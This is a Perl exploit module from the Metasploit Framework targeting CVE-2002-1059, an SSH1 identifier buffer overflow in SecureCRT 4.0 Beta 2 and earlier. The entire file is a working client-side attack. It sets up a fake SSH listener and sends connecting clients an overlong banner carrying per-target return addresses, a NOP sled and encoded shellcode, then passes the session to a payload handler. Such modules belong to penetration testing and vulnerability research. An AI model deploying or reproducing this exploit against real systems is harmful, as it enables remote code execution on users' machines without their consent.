##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::securecrt_ssh1;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use  POSIX;

my $advanced =
  {
  };

my $info =
  {
	'Name'           => 'SecureCRT <= 4.0 Beta 2 SSH1 Buffer Overflow',
	'Version'        => '$Revision: 1.0 $',
	'Authors'        => [ 'y0 [at] w00t-shell.net' ],
	'Description'    =>
	  Pex::Text::Freeform(qq{
		This module exploits a buffer overflow in SecureCRT <= 4.0
		Beta 2. By sending a vulnerable client an overly long 
		SSH1 protocol identifier string, it is possible to execute
        arbitrary code. 
}),

	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32', 'winxp', 'win2000', 'win2003' ],
	'Priv'           => 0,

	'UserOpts'       =>
	  {
		'SSHDPORT'   => [ 1, 'PORT', 'The local SSHD listener port',  22        ],
		'SSHSERVER'  => [ 1, 'HOST', 'The local SSHD listener host', "0.0.0.0"  ],
	  },

	'AutoOpts' => { 'EXITFUNC' => 'process' },

	'Payload'      =>
	  {
		'Space'    => 400,
		'BadChars' => "\x00",
		'Prepend'  => "\x81\xc4\xff\xef\xff\xff\x44",
		'MaxNops'  => 0,
		'Keys'     => [ '-ws2ord', '-bind' ],
	  },

	'Refs'            =>
	  [
		[ 'BID', '5287' ],
		[ 'CVE', '2002-1059' ],
	  ],

	'DefaultTarget'  => 0,

	'Targets'        =>
	  [
		[ 'SecureCRT.exe (3.4.4)',      0x0041b3e0 ],
		[ 'Windows 2000 SP4 English',   0x77e14c29 ],
		[ 'Windows XP SP2 English',     0x77d57447 ],
		[ 'Windows 2003 SP1 English',   0x773b24da ],
	  ],

	'Keys'           => [ 'securecrt' ],

	'DisclosureDate' => 'July 23 2002',
  };

sub new
{
	my $class = shift;
	my $self;

	$self = $class->SUPER::new(
		{
			'Info'     => $info,
			'Advanced' => $advanced,
		},
		@_);

	return $self;
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('SSHSERVER'),
		LocalPort => $self->GetVar('SSHDPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp');
	my $client;

	# Did the listener create fail?
	if (not defined($server))
	{
		$self->PrintLine("[-] Failed to create local SSHD listener on " . $self->GetVar('SSHDPORT'));
		return;
	}

	$self->PrintLine("[*] Waiting for connections to " . $self->GetVar('SSHSERVER') . ":" . $self->GetVar('SSHDPORT') . "...");

	while (defined($client = $server->accept()))
	{
		$self->HandleSecureCRTClient(fd => Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleSecureCRTClient
{
	my $self = shift;
	my ($fd) = @{{@_}}{qw/fd/};
	my $target    = $self->Targets->[$self->GetVar('TARGET')];
	my $shellcode = $self->GetVar('EncodedPayload')->Payload;
	my $rhost;
	my $rport;

	# Set the remote host information
	($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	my $sploit =
	  "SSH-1.1-OpenSSH_3.6.1p2\r\n". Pex::Text::AlphaNumText(243).
	  pack('V', $target->[1]). $self->MakeNops(20). $shellcode;

	$self->PrintLine("[*] Client connected from $rhost:$rport...");

	$fd->Send($sploit);

	$self->PrintLine("[*] Sending ". length($sploit). " bytes to remote host...");

	$self->Handler($fd);

	$fd->Close();
}

1;

